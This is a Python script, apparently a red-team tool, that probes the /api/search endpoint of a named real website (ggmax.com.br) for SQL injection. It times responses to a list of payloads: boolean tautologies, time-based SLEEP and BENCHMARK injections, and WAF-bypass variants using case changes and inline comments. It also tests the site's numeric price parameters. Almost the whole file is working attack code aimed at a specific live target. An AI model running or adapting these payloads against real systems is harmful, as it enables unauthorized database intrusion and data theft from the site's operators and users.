#!/usr/bin/env python3
"""Deeper SQLi timing analysis on /api/search q param."""
import sys, time, json
sys.path.insert(0, '/home/ubuntu/red-team-operator/ggmax.com.br/enum/api')
from api import req

def timed(label, params, n=1):
    times = []
    last = None
    for _ in range(n):
        t = time.time()
        r = req('/api/search', params=params)
        dt = time.time() - t
        times.append(dt)
        last = r
    avg = sum(times)/len(times)
    try:
        d = json.loads(last.get('body',''))
        nn = len(d.get('data',[])); total = d.get('total','?'); sz = last.get('size',0)
    except:
        nn=-1; total='?'; sz=last.get('size',0)
    print(f'{label:55s} avg={avg:5.2f}s times={[round(x,2) for x in times]} n={nn} total={total} sz={sz}')
    return avg

# Reproduce the 10.25s case multiple times
print("=== Reproduce q=test' OR '1'='1 (was 10.25s) ===")
timed("q=test", {'q':'test'}, 3)
timed("q=test'", {'q':"test'"}, 3)
timed("q=test' OR '1'='1", {'q':"test' OR '1'='1"}, 3)
timed("q=test' OR 'a'='a", {'q':"test' OR 'a'='a"}, 3)
timed("q=test' OR 'a'='b", {'q':"test' OR 'a'='b"}, 3)
timed("q=test' AND '1'='1", {'q':"test' AND '1'='1"}, 3)

# Conditional SLEEP (IF/BENCHMARK) — WAF bypass attempts
print("\n=== Conditional time-based (WAF bypass) ===")
# Encode SLEEP differently to bypass WAF
import urllib.parse
payloads = [
    ("q=test' AND IF(1=1,SLEEP(3),0)-- ", {'q':"test' AND IF(1=1,SLEEP(3),0)-- "}),
    ("q=test' AND IF(1=1,SLEEP(3),0)--", {'q':"test' AND IF(1=1,SLEEP(3),0)--"}),
    ("q=test' AND(IF(1=1,SLEEP(3),0))--", {'q':"test' AND(IF(1=1,SLEEP(3),0))--"}),
    ("q=test' AND SLEEP(3)--", {'q':"test' AND SLEEP(3)--"}),
    ("q=test' AND BENCHMARK(5000000,MD5(1))--", {'q':"test' AND BENCHMARK(5000000,MD5(1))--"}),
    ("q=test'+AND+SLEEP(3)--", {'q':"test' AND SLEEP(3)--"}),
    ("q=test'AND SLEEP(3)--", {'q':"test'AND SLEEP(3)--"}),
    # case variation
    ("q=test' And Sleep(3)--", {'q':"test' And Sleep(3)--"}),
    ("q=test' sLeEp(3)--", {'q':"test' sLeEp(3)--"}),
    # inline comment
    ("q=test' S/**/LEEP(3)--", {'q':"test' S/**/LEEP(3)--"}),
    # unicode bypass
    ("q=test' %53LEEP(3)--", {'q':"test' SLEEP(3)--"}),  # already encoded by requests
]
for label, params in payloads:
    timed(label, params, 2)

# Also test max_price / min_price (numeric — might be raw)
print("\n=== max_price / min_price (numeric) ===")
timed("BASE q=test max_price=100", {'q':'test','max_price':'100'}, 2)
timed("max_price=100'", {'q':'test','max_price':"100'"}, 2)
timed("max_price=100 OR 1=1", {'q':'test','max_price':"100 OR 1=1"}, 2)
timed("max_price=100 SLEEP(3)", {'q':'test','max_price':"100 SLEEP(3)"}, 2)
timed("max_price=100 AND SLEEP(3)--", {'q':'test','max_price':"100 AND SLEEP(3)--"}, 2)
timed("max_price=100,0x31", {'q':'test','max_price':"100,0x31"}, 2)
timed("min_price=1'", {'q':'test','min_price':"1'"}, 2)
timed("min_price=1 SLEEP(3)", {'q':'test','min_price':"1 SLEEP(3)"}, 2)
